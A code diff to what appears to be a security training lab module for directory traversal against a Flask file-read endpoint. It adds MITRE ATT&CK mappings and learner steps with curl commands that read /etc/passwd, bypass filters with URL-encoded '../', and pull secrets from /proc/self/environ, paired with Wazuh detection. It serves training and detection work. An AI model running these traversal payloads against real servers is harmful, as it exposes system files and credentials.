@@ -35,6 +35,15 @@ class DirTraversalModule(BaseModule):
     category = Category.FILE
     scenario_id = "APP-03"
     severity = Severity.HIGH
+    # MITRE ATT&CK — exploit the viewer to discover and read files outside the web root.
+    mitre = {
+        "tactics": ["TA0001 Initial Access", "TA0007 Discovery", "TA0006 Credential Access"],
+        "techniques": [
+            {"id": "T1190", "name": "Exploit Public-Facing Application", "tactic": "Initial Access"},
+            {"id": "T1083", "name": "File and Directory Discovery", "tactic": "Discovery"},
+            {"id": "T1552.001", "name": "Unsecured Credentials: Credentials In Files", "tactic": "Credential Access"},
+        ],
+    }
     lab = {
         "target_path": "/files/read",
         "vulnerable_component": "Flask file-read handler (files_bp.read_file)",
@@ -45,15 +54,25 @@ class DirTraversalModule(BaseModule):
             "arbitrary files."
         ),
         "learner_steps": [
-            {"action": "Open the Document Viewer and read the default readme.txt file.",
-             "expected": "You see the contents of the lab readme file."},
-            {"action": "Change the path to ../../etc/passwd and read the file.",
+            {"action": "Baseline the viewer by reading the intended file.",
+             "technique": "T1595.002 Active Scanning: Vulnerability Scanning",
+             "command": "curl -s 'http://target-agent/files/read?path=readme.txt'",
+             "expected": "You see the lab readme — confirming the parameter selects a file."},
+            {"action": "Traverse out of the web root to read /etc/passwd.",
+             "technique": "T1083 File and Directory Discovery",
+             "command": "curl -s -G http://target-agent/files/read --data-urlencode 'path=../../etc/passwd'",
              "expected": "/etc/passwd is displayed — entries like 'root:x:0:0:' are visible."},
-            {"action": "Try URL-encoded traversal: %2e%2e%2f%2e%2e%2fetc%2fpasswd",
-             "expected": "The same file contents appear — encoding bypasses naive filters."},
-            {"action": "Try reading /etc/hostname or ../../proc/self/environ",
-             "expected": "System files are disclosed — path validation is absent."},
+            {"action": "Bypass naive filters with URL-encoded traversal.",
+             "technique": "T1083 File and Directory Discovery",
+             "command": "curl -s 'http://target-agent/files/read?path=%2e%2e%2f%2e%2e%2fetc%2fpasswd'",
+             "expected": "The same file contents appear — encoded ../ defeats simple blocklists."},
+            {"action": "Harvest secrets / environment from other files.",
+             "technique": "T1552.001 Unsecured Credentials: Credentials In Files",
+             "command": "curl -s -G http://target-agent/files/read --data-urlencode 'path=../../proc/self/environ'",
+             "expected": "Process environment (and any secrets in it) is disclosed."},
             {"action": "Check the Evidence panel for Wazuh detections.",
+             "technique": "T1083 File and Directory Discovery",
+             "command": "# review the activity log / Wazuh feed in ATTENSE",
              "expected": "Alert matches '../' traversal patterns in the path parameter."},
         ],
         "detection_rule": "Wazuh path-traversal signature (../ in path parameter)",
@@ -64,7 +83,20 @@ class DirTraversalModule(BaseModule):
         ],
         "quick_probe": "/files/read?path=../../etc/passwd",
     }
-    steps = [{'title': 'Map the file-read endpoint', 'hint': 'GET /files/read?path=readme.txt returns a benign file', 'expected': 'Baseline 200 response with file content'}, {'title': 'Traverse outside the base directory', 'hint': '../../etc/passwd, URL-encoded variants, absolute paths', 'expected': 'System file contents appear in the response body'}, {'title': 'Confirm traversal worked', 'hint': "Look for 'root:', 'www-data:', '/bin/bash' indicators", 'expected': 'Traversal confirmed with leaked /etc/passwd line'}]
+    steps = [
+        {'title': 'Map the file-read endpoint', 'tactic': 'Reconnaissance',
+         'technique': 'T1595.002 Active Scanning: Vulnerability Scanning',
+         'command': "curl -s 'http://target-agent/files/read?path=readme.txt'",
+         'hint': 'GET /files/read?path=readme.txt returns a benign file', 'expected': 'Baseline 200 response with file content'},
+        {'title': 'Traverse outside the base directory', 'tactic': 'Discovery',
+         'technique': 'T1083 File and Directory Discovery',
+         'command': "curl -s -G http://target-agent/files/read --data-urlencode 'path=../../etc/passwd'",
+         'hint': '../../etc/passwd, URL-encoded variants, absolute paths', 'expected': 'System file contents appear in the response body'},
+        {'title': 'Confirm traversal worked', 'tactic': 'Credential Access',
+         'technique': 'T1552.001 Unsecured Credentials: Credentials In Files',
+         'command': "curl -s 'http://target-agent/files/read?path=%2e%2e%2f%2e%2e%2fetc%2fpasswd'",
+         'hint': "Look for 'root:', 'www-data:', '/bin/bash' indicators", 'expected': 'Traversal confirmed with leaked /etc/passwd line'},
+    ]
 
     def options(self) -> list[ModuleOption]:
         return [
@@ -92,6 +124,12 @@ class DirTraversalModule(BaseModule):
         custom = opts.get("custom_path", "").strip()
         if custom:
             payloads.append(("custom", custom))
+
+        # ── Recon (T1595.002): baseline read of the intended file ──
+        self._log(log_fn, "Recon: baseline read of readme.txt (intended use)...")
+        base = self._get(target.base_url + endpoint, params={"path": "readme.txt"},
+                         label="recon-baseline", timeout=target.timeout)
+        steps.append(base)
 
         self._log(log_fn, f"Testing {len(payloads)} traversal payloads against {endpoint}")
 
